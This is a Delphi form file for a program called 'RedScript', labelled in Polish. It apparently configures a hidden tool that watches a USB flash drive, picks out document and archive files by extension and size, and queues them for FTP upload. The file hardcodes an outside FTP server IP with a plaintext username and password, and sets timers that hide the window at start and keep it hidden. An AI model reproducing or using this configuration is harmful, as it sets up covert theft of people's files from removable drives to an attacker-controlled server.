object Form1: TForm1
  Left = 191
  Top = 145
  BorderIcons = [biSystemMenu, biMinimize]
  BorderStyle = bsSingle
  Caption = 'RedScript by sebaqq6 [ver online]'
  ClientHeight = 540
  ClientWidth = 1178
  Color = clBackground
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'MS Sans Serif'
  Font.Style = []
  OldCreateOrder = False
  Position = poScreenCenter
  Visible = True
  WindowState = wsMinimized
  PixelsPerInch = 96
  TextHeight = 13
  object Label2: TLabel
    Left = 8
    Top = 256
    Width = 77
    Height = 13
    Caption = 'FLASH(USB):'
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clTeal
    Font.Height = -11
    Font.Name = 'MS Sans Serif'
    Font.Style = [fsBold]
    ParentFont = False
  end
  object Label1: TLabel
    Left = 8
    Top = 176
    Width = 132
    Height = 13
    Caption = 'Sprawdzanie(sekundy):'
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clLime
    Font.Height = -11
    Font.Name = 'MS Sans Serif'
    Font.Style = [fsBold]
    ParentFont = False
  end
  object Label3: TLabel
    Left = 8
    Top = 136
    Width = 147
    Height = 13
    Caption = 'Przerwa po pracy(minuty):'
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clYellow
    Font.Height = -11
    Font.Name = 'MS Sans Serif'
    Font.Style = [fsBold]
    ParentFont = False
  end
  object Label4: TLabel
    Left = 8
    Top = 96
    Width = 138
    Height = 13
    Caption = 'Max wielko'#347#263' pliku(MB):'
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clFuchsia
    Font.Height = -11
    Font.Name = 'MS Sans Serif'
    Font.Style = [fsBold]
    ParentFont = False
  end
  object Label5: TLabel
    Left = 32
    Top = 384
    Width = 80
    Height = 13
    Caption = 'Rozszerzenia:'
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clBlue
    Font.Height = -11
    Font.Name = 'MS Sans Serif'
    Font.Style = [fsBold]
    ParentFont = False
  end
  object Label6: TLabel
    Left = 392
    Top = 432
    Width = 86
    Height = 16
    Caption = 'Kolejka FTP'
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clWhite
    Font.Height = -13
    Font.Name = 'MS Sans Serif'
    Font.Style = [fsBold]
    ParentFont = False
  end
  object Label7: TLabel
    Left = 888
    Top = 432
    Width = 78
    Height = 16
    Caption = 'BAN LISTA'
    Color = clBackground
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clRed
    Font.Height = -13
    Font.Name = 'MS Sans Serif'
    Font.Style = [fsBold]
    ParentColor = False
    ParentFont = False
  end
  object Label8: TLabel
    Left = 8
    Top = 216
    Width = 135
    Height = 13
    Caption = 'Wysy'#322'anie FTP(minuty):'
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clAqua
    Font.Height = -11
    Font.Name = 'MS Sans Serif'
    Font.Style = [fsBold]
    ParentFont = False
  end
  object Button1: TButton
    Left = 112
    Top = 8
    Width = 97
    Height = 25
    Caption = 'GO!'
    TabOrder = 0
    Visible = False
    OnClick = Button1Click
  end
  object memo_console: TMemo
    Left = 216
    Top = 0
    Width = 961
    Height = 425
    BorderStyle = bsNone
    Color = clBlack
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clGreen
    Font.Height = -11
    Font.Name = 'MS Sans Serif'
    Font.Style = [fsBold]
    Lines.Strings = (
      'To jest konsola, jak w matrixie ;)')
    ParentFont = False
    ReadOnly = True
    ScrollBars = ssBoth
    TabOrder = 1
    WantReturns = False
  end
  object editFLASH: TEdit
    Left = 8
    Top = 272
    Width = 121
    Height = 21
    TabOrder = 2
    Text = 'F'
  end
  object buttonFLASHSet: TButton
    Left = 136
    Top = 272
    Width = 49
    Height = 25
    Caption = 'OK'
    TabOrder = 3
    OnClick = buttonFLASHSetClick
  end
  object buttonANULUJ: TButton
    Left = 128
    Top = 352
    Width = 67
    Height = 25
    Caption = 'Anuluj!'
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clRed
    Font.Height = -11
    Font.Name = 'MS Sans Serif'
    Font.Style = [fsBold]
    ParentFont = False
    TabOrder = 4
    OnClick = buttonANULUJClick
  end
  object checkWORK: TCheckBox
    Left = 64
    Top = 8
    Width = 97
    Height = 17
    Caption = 'S'#321'U'#379'BA :)'
    Color = clBlack
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clRed
    Font.Height = -11
    Font.Name = 'MS Sans Serif'
    Font.Style = [fsBold]
    ParentColor = False
    ParentFont = False
    TabOrder = 5
    OnClick = checkWORKClick
  end
  object spinCheck: TCSpinEdit
    Left = 8
    Top = 192
    Width = 185
    Height = 22
    EditorEnabled = False
    MaxValue = 50
    MinValue = 1
    TabOrder = 6
    Value = 5
    OnChange = spinCheckChange
    OnKeyPress = spinCheckKeyPress
  end
  object spinPause: TCSpinEdit
    Left = 8
    Top = 152
    Width = 185
    Height = 22
    EditorEnabled = False
    MaxValue = 60
    MinValue = 1
    TabOrder = 7
    Value = 10
    OnChange = spinPauseChange
    OnKeyPress = spinPauseKeyPress
  end
  object spinMaxFile: TCSpinEdit
    Left = 8
    Top = 112
    Width = 185
    Height = 22
    EditorEnabled = False
    MaxValue = 500
    MinValue = 1
    TabOrder = 8
    Value = 100
    OnChange = spinMaxFileChange
    OnKeyPress = spinMaxFileKeyPress
  end
  object ext_list: TMemo
    Left = 128
    Top = 392
    Width = 73
    Height = 129
    BorderStyle = bsNone
    Color = clBlack
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clLime
    Font.Height = -11
    Font.Name = 'MS Sans Serif'
    Font.Style = []
    Lines.Strings = (
      '.txt'
      '.doc'
      '.docx'
      '.ppt'
      '.pptx'
      '.pdf'
      '.pps'
      '.ppsx'
      '.html'
      '.xls'
      '.xlsx'
      '.xlsm'
      '.odp'
      '.odt'
      '.zip'
      '.rar')
    ParentFont = False
    ScrollBars = ssVertical
    TabOrder = 9
  end
  object buttonSaveExt: TButton
    Left = 8
    Top = 408
    Width = 105
    Height = 41
    Caption = 'Zapisz rozszerzenia'
    TabOrder = 10
    OnClick = buttonSaveExtClick
  end
  object queue_ftp_send: TMemo
    Left = 208
    Top = 448
    Width = 473
    Height = 89
    BorderStyle = bsNone
    Color = clBlack
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clSilver
    Font.Height = -13
    Font.Name = 'MS Sans Serif'
    Font.Style = [fsBold]
    ParentFont = False
    ReadOnly = True
    ScrollBars = ssBoth
    TabOrder = 11
  end
  object banlist: TMemo
    Left = 696
    Top = 448
    Width = 473
    Height = 89
    BorderStyle = bsNone
    Color = clMaroon
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clWhite
    Font.Height = -13
    Font.Name = 'MS Sans Serif'
    Font.Style = [fsBold]
    ParentFont = False
    ReadOnly = True
    ScrollBars = ssBoth
    TabOrder = 12
  end
  object spinFTPTimer: TCSpinEdit
    Left = 8
    Top = 232
    Width = 185
    Height = 22
    EditorEnabled = False
    MaxValue = 30
    MinValue = 1
    TabOrder = 13
    Value = 10
    OnChange = spinFTPTimerChange
    OnKeyPress = spinFTPTimerKeyPress
  end
  object HideWindowOnStart: TTimer
    Interval = 1
    OnTimer = HideWindowOnStartTimer
  end
  object ProgramTimer: TTimer
    Enabled = False
    Interval = 5000
    OnTimer = ProgramTimerTimer
    Top = 16
  end
  object WindowVisibleControl: TTimer
    OnTimer = WindowVisibleControlTimer
    Top = 32
  end
  object HTTP: TIdHTTP
    Request.Accept = 'text/html, */*'
    Request.ContentLength = 0
    Request.ContentRangeEnd = 0
    Request.ContentRangeStart = 0
    Request.ContentType = 'application/x-www-form-urlencoded'
    Request.ProxyPort = 0
    Request.UserAgent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'
    Top = 64
  end
  object FTP: TIdFTP
    OnDisconnected = FTPDisconnected
    Host = '155.133.24.250'
    OnConnected = FTPConnected
    SocksInfo.Authentication = saUsernamePassword
    Passive = True
    Password = 'j4n13hsz'
    User = '16'
    Left = 24
  end
  object T_FTPSend: TTimer
    Enabled = False
    Interval = 5000
    OnTimer = FTPSendTimer
    Left = 24
    Top = 24
  end
end
